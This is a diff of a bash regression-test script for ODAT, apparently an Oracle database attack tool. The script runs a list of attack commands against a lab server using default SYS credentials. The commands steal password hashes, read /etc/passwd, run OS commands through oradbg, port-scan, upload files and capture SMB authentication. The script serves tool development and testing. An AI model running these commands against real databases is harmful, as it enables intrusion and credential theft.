@@ -2,12 +2,12 @@
 #Constants
 ALL_IS_OK=0
 #Connection information
-SERVER=192.168.142.73
+SERVER=192.168.56.101
 SID=ORCL
 USER="SYS"
-PASSWORD=''
+PASSWORD='oracle'
 #OPTIONS
-VERBOSE='' #'> /dev/null'
+VERBOSE='-vv' #'> /dev/null'
 
 
 tests=( "./odat.py all -s $SERVER"
@@ -23,7 +23,7 @@ tests=( "./odat.py all -s $SERVER"
 	"./odat.py utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
 	"./odat.py utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 1521,443,22"
 	"./odat.py utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 20-30"
-	"echo 'GET / HTTP/1.0\n' > ./temp.txt; ./odat.py utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --send google.com 80 temp.txt ;rm ./temp.txt"
+	"echo 'GET / HTTP/1.0\n\n' > ./temp.txt; ./odat.py utlhttp -s $SERVER -d $SID -U $USER -P $PASSWORD --send google.com 80 temp.txt ;rm ./temp.txt"
 	"./odat.py httpuritype -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
 	"./odat.py httpuritype -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 1521,443,22"
 	"./odat.py httpuritype -s $SERVER -d $SID -U $USER -P $PASSWORD --scan-ports 127.0.0.1 20-30"
@@ -40,7 +40,7 @@ tests=( "./odat.py all -s $SERVER"
 	"./odat.py dbmsxslprocessor -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
 	"./odat.py dbmsxslprocessor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt accounts_small.txt"
 	"./odat.py dbmsadvisor -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
-	"./odat.py dbmsadvisor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/: file.txt ./accounts_small.txt"
+	"./odat.py dbmsadvisor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt ./accounts_small.txt"
 	"./odat.py utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module --getFile /etc/ passwd passwd.txt"
 	"./odat.py utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt accounts_small.txt"
 	"./odat.py utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --removeFile /tmp/ file.txt"
@@ -52,10 +52,13 @@ tests=( "./odat.py all -s $SERVER"
 	"./odat.py passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --get-passwords"
 	"./odat.py oradbg -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
 	"./odat.py oradbg -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /bin/ls"
-	"sudo ./odat.py stealRemotePwds -s $SERVER -d $SID --test-module"
-	"sudo ./odat.py stealRemotePwds -s $SERVER -d $SID --user-list accounts_small.txt --get-all-passwords"
-	"sudo chmod o+r sessions-$SERVER-1521-$SID.txt; ./odat.py stealRemotePwds -s $SERVER -d $SID --decrypt-sessions sessions-$SERVER-1521-$SID.txt accounts_small.txt"
-	
+	"sudo ./odat.py stealremotepwds -s $SERVER -d $SID --test-module"
+	"sudo ./odat.py stealremotepwds -s $SERVER -d $SID --user-list accounts_small.txt --get-all-passwords"
+	"sudo chmod o+r sessions-$SERVER-1521-$SID.odat.challenge; ./odat.py stealremotepwds -s $SERVER -d $SID --decrypt-sessions sessions-$SERVER-1521-$SID.odat.challenge accounts_small.txt"
+	"./odat.py dbmslob -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
+	"./odat.py dbmslob -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile /etc/ passwd temp.txt"
+	"./odat.py smb -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module"
+	"./odat.py smb -s $SERVER -d $SID -U $USER -P $PASSWORD --capture 127.0.0.1 SHARE"
       )
 
 function isGoodReturnValue {
@@ -65,11 +68,27 @@ function isGoodReturnValue {
 	else
 		echo -e "    \e[0;31mKO!\e[0;m"
 	fi
-} 
+}
 
-for aTest in "${tests[@]}"
-do
-	echo -e "\n\e[1m\e[96m[+] TEST that : $aTest $VERBOSE \e[m"
-	eval "$aTest $VERBOSE"
-	isGoodReturnValue $?
-done
+
+read -p "This script should be used during the ODAT development ONLY to check if there are no errors. Do you want continue? (Y for Yes)" -n 1 -r
+echo
+if [[ $REPLY =~ ^[Yy]$ ]]
+then
+    for aTest in "${tests[@]}"
+	do
+		echo -e "\n\e[1m\e[96m[+] TEST that : $aTest $VERBOSE \e[m"
+		eval "$aTest $VERBOSE"
+		isGoodReturnValue $?
+	done
+	echo -e '\e[0;32mDone ! \e[m'
+else
+	echo -e '\e[0;31mNo check has been done ! \e[m'
+fi
+
+
+
+
+
+
+
